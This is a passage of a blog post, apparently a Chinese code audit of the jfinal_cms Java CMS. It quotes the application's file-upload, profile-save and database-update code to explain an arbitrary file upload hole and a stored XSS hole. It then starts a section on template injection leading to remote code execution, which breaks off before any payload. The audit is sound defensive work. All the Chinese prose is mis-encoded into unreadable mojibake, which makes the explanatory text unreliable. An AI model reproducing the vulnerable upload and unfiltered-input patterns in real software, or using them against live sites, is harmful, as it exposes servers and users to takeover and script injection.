class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; è¿™é‡ŒmaxSizeæ˜¯é»˜è®¤ä¸º0ã€‚<br><img src="https://img-blog.csdnimg.cn/2020041214043196.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2020041214394072.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp;  ä¸‹é¢çš„ä¸€æ®µä»£ç æ˜¯åˆ¤æ–­æ˜¯å¦åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œåœ¨é…ç½®æ–‡ä»¶<code>E:\Soures\jfinal_cms\src\main\resources\conf\filemanager.properties</code>ä¸‹å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤å†™å’Œä¸Šä¼ æ–‡ä»¶å¤§å°è®¾ç½®æ˜¯ä¸º0çš„ï¼ˆ<code>0ä»£è¡¨çš„æ˜¯æ²¡æœ‰é™åˆ¶</code>ï¼‰ï¼Œé»˜è®¤æ˜¯å¯ä»¥ä¸Šä¼ å…¶ä»–æ–‡ä»¶ï¼ˆ<code>upload-imagesonly=false</code>ï¼‰ã€‚<br><img src="https://img-blog.csdnimg.cn/20200412144828539.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!isImage(item.getName())</span><br><span class="line">        &amp;&amp; (getConfig(<span class="string">"upload-imagesonly"</span>) != <span class="keyword">null</span> &amp;&amp; getConfig(<span class="string">"upload-imagesonly"</span>).equals(<span class="string">"true"</span>) || <span class="keyword">this</span>.params</span><br><span class="line">        .get(<span class="string">"type"</span>) != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.params.get(<span class="string">"type"</span>).equals(<span class="string">"Image"</span>))) &#123;</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"UPLOAD_IMAGES_ONLY"</span>));</span><br><span class="line">    error = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œåé¢ä¼šç”¨åˆ°ã€‚ä½œç”¨æ˜¯å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶ä»¥ä¸´æ—¶æ–‡ä»¶çš„å­˜æ”¾ç€ï¼Œç„¶åæŠŠå¤åˆ¶åˆ°ä¸Šä¼ ç›®å½•ä¸‹ï¼Œé‡æ–°å‘½ååˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">            tmpFile = <span class="keyword">new</span> File(<span class="keyword">this</span>.fileRoot + TMP_PATH + <span class="string">"filemanager_"</span> + System.currentTimeMillis() + <span class="string">".tmp"</span>);</span><br><span class="line">            File filePath = tmpFile.getParentFile();</span><br><span class="line">            <span class="keyword">if</span> (!filePath.exists()) &#123;</span><br><span class="line">                filePath.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            item.write(tmpFile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; æ–‡ä»¶ä¸Šä¼ åçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è¯´åˆ°çš„å¤åˆ¶é‡å‘½åï¼Œæœ€åå°†ä¸´æ—¶æ–‡ä»¶åˆ é™¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// file rename</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!error &amp;&amp; tmpFile != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String allowed[] = &#123;<span class="string">"."</span>, <span class="string">"-"</span>&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"add"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String currentPath = <span class="string">""</span>;</span><br><span class="line">                String fileName = params.get(<span class="string">"_fileName"</span>);</span><br><span class="line">                String filePath = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    currentPath = params.get(<span class="string">"currentpath"</span>);</span><br><span class="line">                    respPath = currentPath;</span><br><span class="line">                    currentPath = <span class="keyword">new</span> String(currentPath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// ä¸­æ–‡è½¬ç </span></span><br><span class="line">                    currentPath = getFilePath(currentPath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                filePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + currentPath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(filePath, fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(filePath + fileName);</span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"replace"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String fileName = <span class="string">""</span>;</span><br><span class="line">                String newFilePath = <span class="string">""</span>;</span><br><span class="line">                String saveFilePath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    newFilePath = params.get(<span class="string">"newfilepath"</span>);</span><br><span class="line">                    newFilePath = <span class="keyword">new</span> String(newFilePath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// ä¸­æ–‡è½¬ç </span></span><br><span class="line">                    respPath = newFilePath.substring(<span class="number">0</span>, newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    fileName = newFilePath.substring(newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    newFilePath = getFilePath(newFilePath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                saveFilePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + newFilePath);</span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(saveFilePath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(saveFile.getParent(), fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (saveFile.exists()) &#123;</span><br><span class="line">                    <span class="comment">// before bakup</span></span><br><span class="line">                    bakupFile(saveFile);</span><br><span class="line">                    <span class="comment">// delete src file</span></span><br><span class="line">                    saveFile.delete();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">        <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸´æ—¶æ–‡ä»¶å¤„ç†</span></span><br><span class="line">    <span class="keyword">if</span> (tmpFile.exists()) &#123;</span><br><span class="line">        tmpFile.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fileInfo;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol><li>å¼€å‘è€…éœ€è¦é€šè¿‡é™åˆ¶ä¸Šä¼ æ–‡ä»¶å¤§å°æ¥é™åˆ¶ä¸€äº›æ–‡ä»¶çš„ä¸Šä¼ ï¼Œä½†é»˜è®¤é…ç½®æ˜¯æ²¡æœ‰é™åˆ¶ï¼Œå¾ˆå¯èƒ½æ˜¯å¼€å‘è€…ä¸ºäº†è‡ªå·±å¼€å‘æ–¹ä¾¿ï¼Œä½†æœ€åå¿˜è®°ä¿®æ”¹è®¾ç½®ã€‚</li><li>ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯ä¸Šä¼ å›¾ç‰‡ä¹‹åï¼Œæ²¡æœ‰åœ¨åšå…¶ä»–åˆ¤æ–­é™åˆ¶ï¼Œç„¶åå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</li><li>é…ç½®æ–‡ä»¶ä¸­é»˜è®¤æ˜¯ä¸å¼€å¯<code>filemanager.upload-imagesonly</code>éœ€è¦ä½¿ç”¨è€…æ‰‹åŠ¨è®¾ç½®ã€‚</li><li>å¼€å‘è€…ä»…ä»…åœ¨å‰ç«¯åšäº†æ–‡ä»¶ä¸Šä¼ çš„ç™½åå•ï¼Œåç«¯æ²¡æœ‰æ²¡æœ‰è¿›è¡Œæ ¡éªŒï¼Œå¯¼è‡´é»‘å®¢å¯ä»¥ç»•è¿‡å‰ç«¯éªŒè¯ï¼Œä¸Šä¼ ä»»æ„æ¶æ„æ–‡ä»¶ã€‚ï¼ˆå‰ç«¯éªŒè¯æœ¬æ–‡æ²¡æœ‰ä½“ç°ï¼Œä½†çœŸçš„åšäº†é™åˆ¶ï¼Œæœ‰è¯¦æƒ…çš„ç«¥é‹å¯ä»¥å»çœ‹çœ‹ã€‚ï¼‰</li></ol><hr><h1 id="å­˜å‚¨å‹XSSæ¼æ´"><a href="#å­˜å‚¨å‹XSSæ¼æ´" class="headerlink" title="å­˜å‚¨å‹XSSæ¼æ´"></a>å­˜å‚¨å‹XSSæ¼æ´</h1><p><img src="https://img-blog.csdnimg.cn/20200407185120625.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200407185154471.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200407185238421.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>&emsp;&emsp; æ¼æ´æºç å­˜åœ¨äº<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\front\controller\PersonController.java</code><br>&emsp;&emsp; ç¬¬ä¸€éƒ¨åˆ†åŠŸèƒ½æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ol><li>å°†æäº¤æ•°æ®JsonåŒ–</li><li>æ ¹æ®ç”¨æˆ·Sessionåˆ¤æ–­ç”¨æˆ·idï¼ˆæ•°æ®åº“å†…çš„idï¼‰</li><li>åˆ¤æ–­æ—§å¯†ç å’Œæ–°è®¾ç½®çš„å¯†ç æ˜¯å¦æ­£ç¡®</li><li>åˆ¤æ–­Emailçš„æ ¼å¼æ˜¯å¦æ­£ç¡®<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">JSONObject json = <span class="keyword">new</span> JSONObject();</span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">2</span>);<span class="comment">// å¤±è´¥</span></span><br><span class="line"></span><br><span class="line">SysUser user = (SysUser) getSessionUser();</span><br><span class="line"><span class="keyword">int</span> userid = user.getInt(<span class="string">"userid"</span>);</span><br><span class="line">SysUser model = getModel(SysUser<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (userid != model.getInt(<span class="string">"userid"</span>)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"æäº¤æ•°æ®é”™è¯¯ï¼"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸‰æ–¹ç”¨æˆ·ä¸éœ€è¦å¯†ç </span></span><br><span class="line"><span class="keyword">if</span> (user.getInt(<span class="string">"usertype"</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">String oldPassword = getPara(<span class="string">"old_password"</span>);</span><br><span class="line">String newPassword = getPara(<span class="string">"new_password"</span>);</span><br><span class="line">String newPassword2 = getPara(<span class="string">"new_password2"</span>);</span><br><span class="line"><span class="keyword">if</span> (!user.getStr(<span class="string">"password"</span>).equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"å¯†ç é”™è¯¯ï¼"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword) &amp;&amp; !newPassword.equals(newPassword2)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"ä¸¤æ¬¡æ–°å¯†ç ä¸ä¸€è‡´ï¼"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword)) &#123; <span class="comment">// è¾“å…¥å¯†ç å¹¶ä¸”ä¸€ç›´</span></span><br><span class="line">model.set(<span class="string">"password"</span>, JFlyFoxUtils.passwordEncrypt(newPassword));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(model.getStr(<span class="string">"email"</span>)) &amp;&amp; model.getStr(<span class="string">"email"</span>).indexOf(<span class="string">"@"</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"emailæ ¼å¼é”™è¯¯ï¼"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>&emsp;&emsp; <code>model.update();</code>æ–¹æ³•æ˜¯æ›´æ–°æ•°æ®ï¼Œå°†ä¿¡æ¯å†™å…¥æ•°æ®åº“ã€‚å…·ä½“å®ä¹ æ–¹æ³•å¯ä»¥ä¸‹ä¸€éƒ¨åˆ†ä»£ç ã€‚<br><img src="https://img-blog.csdnimg.cn/20200412175111793.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">model.update();</span><br><span class="line">UserCache.init(); <span class="comment">// è®¾ç½®ç¼“å­˜</span></span><br><span class="line">SysUser newUser = SysUser.dao.findById(userid);</span><br><span class="line">setSessionUser(newUser); <span class="comment">// è®¾ç½®session</span></span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">1</span>);<span class="comment">// æˆåŠŸ</span></span><br><span class="line"></span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>&emsp;&emsp; é¦–å…ˆæ–¹æ³•ä¼šè¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªsqlè¯­å¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">filter(FILTER_BY_UPDATE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_getModifyFlag().isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table table = _getTable();</span><br><span class="line">String[] pKeys = table.getPrimaryKey();</span><br><span class="line"><span class="keyword">for</span> (String pKey : pKeys) &#123;</span><br><span class="line">Object id = attrs.get(pKey);</span><br><span class="line"><span class="keyword">if</span> (id == <span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(<span class="string">"You can't update model without Primary Key, "</span> + pKey + <span class="string">" can not be null."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Config config = _getConfig();</span><br><span class="line">StringBuilder sql = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">List&lt;Object&gt; paras = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">config.dialect.forModelUpdate(table, attrs, _getModifyFlag(), sql, paras);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (paras.size() &lt;= <span class="number">1</span>) &#123;<span class="comment">// Needn't update</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; åˆ›å»ºæ•°æ®åº“è¿æ¥ï¼Œæ›´æ–°æ•°æ®ã€‚    å¯ä»¥çœ‹åˆ°æ‰§è¡Œå®Œè¿™æ­¥å°±ä¼šæ›´æ–°æ•°æ®åº“å†…å®¹ã€‚ï¼ˆ<code>åˆ©ç”¨MySQLè¯­å¥ç›‘æ§ï¼Œå¯ä»¥çœ‹åˆ°æœ€ä¸‹é¢çš„ä¸€æ¡æ˜¯æ‰§è¡Œçš„sqlè¯­å¥</code>ï¼‰<br><img src="https://img-blog.csdnimg.cn/20200412175227291.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200412175330982.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --------</span></span><br><span class="line">Connection conn = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">conn = config.getConnection();</span><br><span class="line"><span class="keyword">int</span> result = Db.update(config, conn, sql.toString(), paras.toArray());</span><br><span class="line"><span class="keyword">if</span> (result &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">_getModifyFlag().clear();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(e);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">config.close(conn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br></pre></td></tr></table></figure><hr><h2 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol><li>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•´ä¸ªæ•°æ®æ›´æ–°çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬æ²¡æœ‰çœ‹åˆ°ä»»ä½•çš„é˜²æŠ¤æªæ–½ï¼Œè¿‡æ»¤å­—ç¬¦æ‰‹æ®µã€‚</li></ol><hr><h1 id="SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´"></a>SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´</h1><h2 id="å‰è¨€-1"><a href="#å‰è¨€-1" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp; æ„Ÿè°¢é•¿äº­ç§‘æŠ€å¤§ä½¬@Lilcè€å¿ƒæŒ‡å¯¼ï¼Œè¿™ä¸ªæ¼æ´ä¹Ÿæ˜¯è¿™ä½å¤§ä½¬æŒ–çš„ï¼Œæˆ‘åªæ˜¯æ¼æ´å¤ç°å¹¶ç»™å¤§å®¶åˆ†äº«ä¸€ä¸‹ç¬”è€…æ„é€ SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´payloadç»éªŒã€‚</p><hr><p><img src="https://img-blog.csdnimg.cn/20200413194319697.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; æ¼æ´å­˜åœ¨çš„ä½ç½®åœ¨ç®¡ç†å‘˜åå°æ¨¡æ¿ä¿®æ”¹ä¸‹ï¼Œå¯ä»¥ä¿®æ”¹æ¨¡æ¿ä»£ç ï¼Œæ’å…¥æ¶æ„ä»£ç ç­‰æ“ä½œã€‚æ’å…¥ä¸€æ®µæ¶æ„ä»£ç å¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><hr><h3 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h3><p><img src="https://img-blog.csdnimg.cn/20200414163051378.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200414163122383.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h3 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>&emsp;&emsp; 